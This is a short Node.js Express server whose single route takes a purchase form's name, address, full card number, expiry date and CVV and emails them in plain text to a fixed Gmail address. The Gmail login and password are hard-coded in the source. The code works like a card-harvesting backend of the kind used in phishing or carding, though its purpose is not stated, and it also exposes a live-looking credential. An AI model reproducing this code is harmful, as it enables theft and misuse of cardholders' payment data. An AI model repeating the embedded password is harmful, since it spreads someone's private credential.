const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware to parse incoming form data
app.use(bodyParser.json());
app.use(cors());

// Route to handle form submission
app.post('/send-email', (req, res) => {
    const { name, email, address, city, state, zip, cardNumber, expiryDate, cvv } = req.body;

    // Set up Nodemailer transporter (you can use your own email service)
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'kli364409@gmail.com', // replace with your email
            pass: 'leon0428ANG!',  // replace with your email password (or use environment variables)
        },
    });

    const mailOptions = {
        from: 'kli364409@gmail.com',
        to: 'kli364409@gmail.com', // your email to receive the form data
        subject: 'New Purchase Form Submission',
        text: `You received a new submission:
        Name: ${name}
        Email: ${email}
        Address: ${address}
        City: ${city}
        State: ${state}
        ZIP: ${zip}
        Card Number: ${cardNumber} 
        Expiry Date: ${expiryDate}
        CVV: ${cvv}`,
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send('Error sending email');
        }
        res.status(200).send('Email sent successfully');
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
